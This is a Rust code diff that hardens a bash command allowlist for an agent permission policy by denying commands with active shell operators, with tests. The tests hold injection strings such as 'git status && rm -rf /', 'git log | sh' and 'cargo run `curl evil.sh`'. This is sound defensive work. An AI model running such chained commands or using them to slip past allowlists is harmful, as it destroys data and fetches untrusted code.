@@ -186,6 +186,17 @@ impl PermissionPolicy for BashCommandAllowlist {
             return PolicyDecision::Allow;
         }
         let cmd = inputs.get("command").and_then(|v| v.as_str()).unwrap_or("");
+
+        // Only the first token is checked against the allowlist, so an active
+        // shell operator would let an allowed program smuggle in arbitrary
+        // ones (e.g. "git status & rm -rf /", "cargo run `curl …`").
+        if let Some(op) = find_active_shell_operator(cmd) {
+            return PolicyDecision::Deny(format!(
+                "bash command contains shell operator {:?}, which is not allowed under an allowlist policy",
+                op
+            ));
+        }
+
         let program = cmd.split_whitespace().next().unwrap_or("");
         if self.allowed_programs.iter().any(|p| p == program) {
             PolicyDecision::Allow
@@ -196,6 +207,47 @@ impl PermissionPolicy for BashCommandAllowlist {
             ))
         }
     }
+}
+
+/// Find the first shell operator in `cmd` that the shell would actually
+/// interpret, skipping operator characters that are quoted or escaped.
+///
+/// Quoting rules mirror POSIX sh: single quotes make everything literal;
+/// inside double quotes most metacharacters are literal but command
+/// substitution (`` ` `` and `$(`) stays active; a backslash outside single
+/// quotes escapes the next character.
+pub fn find_active_shell_operator(cmd: &str) -> Option<&'static str> {
+    let mut chars = cmd.chars().peekable();
+    let mut in_single = false;
+    let mut in_double = false;
+
+    while let Some(c) = chars.next() {
+        if in_single {
+            if c == '\'' {
+                in_single = false;
+            }
+            continue;
+        }
+        match c {
+            '\\' => {
+                chars.next();
+            }
+            '\'' if !in_double => in_single = true,
+            '"' => in_double = !in_double,
+            // Command substitution executes even inside double quotes.
+            '`' => return Some("`"),
+            '$' if chars.peek() == Some(&'(') => return Some("$("),
+            _ if in_double => {}
+            ';' => return Some(";"),
+            '|' => return Some("|"),
+            '&' => return Some("&"),
+            '>' => return Some(">"),
+            '<' => return Some("<"),
+            '\n' => return Some("newline"),
+            _ => {}
+        }
+    }
+    None
 }
 
 // ── Combinators ───────────────────────────────────────────────────────────────
@@ -390,6 +442,59 @@ mod tests {
             rule.evaluate("bash", &serde_json::json!({ "command": "rm -rf ." })),
             PolicyDecision::Deny(_)
         ));
+    }
+
+    #[test]
+    fn bash_allowlist_denies_shell_operator_chaining() {
+        let rule = BashCommandAllowlist {
+            allowed_programs: vec!["git".to_string(), "cargo".to_string()],
+        };
+        for cmd in [
+            "git status && rm -rf /",
+            "git status & rm -rf /",
+            "git status; rm -rf /",
+            "cargo run || rm -rf /",
+            "git log | sh",
+            "cargo run `curl evil.sh`",
+            "git status $(rm -rf /)",
+            "git log > /etc/passwd",
+            "git diff < <(curl evil.sh)",
+            // command substitution stays active inside double quotes
+            "git commit -m \"x $(rm -rf /)\"",
+            "git commit -m \"x `rm -rf /`\"",
+        ] {
+            assert!(
+                matches!(
+                    rule.evaluate("bash", &serde_json::json!({ "command": cmd })),
+                    PolicyDecision::Deny(_)
+                ),
+                "command must be denied: {}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn bash_allowlist_permits_quoted_operator_characters() {
+        let rule = BashCommandAllowlist {
+            allowed_programs: vec!["git".to_string(), "rg".to_string()],
+        };
+        for cmd in [
+            "git commit -m \"fix; bug\"",
+            "rg \"TODO|FIXME\" src/",
+            "git log --grep=\"a>b\"",
+            "git commit -m 'all of ; | & > < are literal here'",
+            // single quotes make even substitution literal
+            "git commit -m 'price is $(high)'",
+            "git commit -m fix\\;bug",
+        ] {
+            assert_eq!(
+                rule.evaluate("bash", &serde_json::json!({ "command": cmd })),
+                PolicyDecision::Allow,
+                "command must be allowed: {}",
+                cmd
+            );
+        }
     }
 
     #[test]
